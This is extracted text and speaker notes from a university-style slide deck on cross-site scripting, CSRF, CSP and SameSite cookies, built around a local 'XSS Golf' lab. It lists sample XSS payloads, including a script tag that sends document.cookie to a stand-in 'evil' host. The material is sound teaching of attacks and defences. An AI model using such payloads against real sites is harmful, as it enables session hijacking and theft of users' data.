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pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust."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Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser).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bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding.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Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ.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 home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it.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row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone). Be clear DOM isn't part of today's graded tasks.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XSS Golf payloads. There's no filter in this app to explain a bypass for — correct that instinct if it comes up. The context point (HTML body vs attribute vs JS vs URL) is still the real learning; `"&gt;` breaks out of an attribute first.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XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a comment. Don't let "SameSite fixes CSRF" stand unqualified — this week's own fixed_app.py sets SameSite=Strict+HttpOnly+Secure and the CSRF PoC still works, because /comments never checks a session or token at all.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real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next.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 for the worksheet — these three are what's graded this week. Clickjacking (CWE-1021) isn't part of this lab; don't cite it here.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#1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). Be accurate about CSP here: this lab's escaping already neutralizes every payload before CSP would ever matter, so students will NOT see a CSP violation fire in the console today — it's set as a header, its blocking behavior is asserted, not demonstrated, in this sandbox.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this app is local, not Juice Shop; solo, not a bonus-round competition. The real graded turn is running fixed_app.py and showing escaping stops the golf payloads while CSRF still gets through — that contrast is the point.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Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. Q6 of the quiz asks for their own scoring payload + the sink it hit.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Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. Q6 of the quiz asks for their own scoring payload + the sink it hit.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Before/after + the reasoning note — the CSRF note is graded on getting the SameSite-doesn't-equal-authorization distinction right, not on claiming the defense worked. Remind the AI-resilient tasks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"where is the XSS bug — input or output?" (output rendering). Second cold-call: "if SameSite=Strict is set, why did CSRF still work today?" (the endpoint never checked who was asking).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— change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop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&amp; Client-Side Risks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security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XSS: reflected / stored / DOM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+ SameSite cookies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 (CSP)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XSS Golf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Week 4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= data interpreted as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fix SQLi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returns today — in the browser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security model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Same-Origin Policy (SOP): scripts only read data from same origin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= scheme + host + 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Cookies, DOM, storage scoped per origin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= injection into the page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JavaScript runs in the victim's browser, in the site's origin.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cookies/sessions, keylog, rewrite the page, pivot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OWASP A05:2025 Injection (output side)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flavors of XSS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Type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Where the payload lives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Reflected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in the request, echoed back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Stored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saved server-side, served to others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DOM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client-side JS writes untrusted data to the DOM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191256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31520" y="33009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graded app (vulnerable_app.py) implements reflected + stored only; DOM XSS is optional, via the ungraded Juice Shop target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payloads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&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;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src=x onerror=alert(1)&gt;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"&gt;&lt;svg onload=alert(1)&gt;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423160"/>
            <a:ext cx="8229600" cy="1499616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532888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matters: HTML body vs attribute vs JS vs URL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vulnerable_app.py filters nothing — every payload here fires as-is; the &lt;img onerror&gt; form isn't "the one that sneaks past a filter," it's just 3 characters longer than &lt;script&gt;alert(1)&lt;/script&gt; (28 vs. 25) — a real golf trade-off, not a bypass technique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— riding the user's session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10512"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 40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auto-sends cookies → attacker forges a state-changing request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defenses: anti-CSRF tokens, checking Origin/Referer, and the endpoint actually checking who's asking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SameSite=Strict alone stops the cookie from attaching cross-site — it does not stop a request from being accepted if the endpoint never checks authorization in the first place (today's lab proves this)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Real-world: British Airways (2018)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injected malicious JS (Magecart) into BA's site/app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skimmed credit-card details as users typed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~380k payment records skimmed; ICO proposed a £183M fine, finalized at £20M (2020, ~89% reduction)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898648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89864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injection = real money + real fines.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mapping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CWE-79 — Cross-site scripting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CWE-352 — CSRF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CWE-1004 — cookie set without HttpOnly (this week's cookie-theft task)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encoding per context (HTML/attr/JS/URL)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auto-escaping (don't bypass with innerHTML/dangerouslySetInnerHTML)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 — a defense-in-depth header, set alongside escaping — it doesn't replace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+ SameSite cookies; anti-CSRF tokens and an endpoint that actually checks who's asking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⛳ Game — XSS Golf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shortest payload that pops alert(1) / steals a cookie against vulnerable_app.py.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82296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350008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scoring by character count (no filter to beat — it's a golf exercise, not a bypass race)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Defend: run fixed_app.py — same payloads, now escaped — then prove CSRF still works against it and explain why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5 — labs/week05-xss-client-side/worksheet.md (Part 3) · kickoff: docker compose up → http://localhost:8080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313432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231343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reflected + stored XSS in vulnerable_app.py (DOM XSS via Juice Shop is optional/ungraded)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" y="3044952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304495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cookie theft via the stored payload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02920" y="352044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35204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fixed_app.py — confirm output encoding + CSP now block your XSS payloads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1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CSRF still succeeds against fixed_app.py — explain why SameSite didn't stop it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XSS type with payload + context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+ CSP that blocks them (show before/after)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note: why CSRF still succeeds against fixed_app.py despite SameSite=Strict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is injection on the output side — encode for the context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is defense-in-depth, not a substitute for encoding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 cookies stop the cookie attaching cross-site — they don't stop a request being accepted if the endpoint never checks authorization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5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Authentication, sessions &amp; access control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5</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Nutthakorn Chalaemwongwan</dc:creator>
  <cp:lastModifiedBy>Nutthakorn Chalaemwongwan</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-13T10:31:32Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-13T10:31:32Z</dcterms:modified>
</cp:coreProperties>
</file>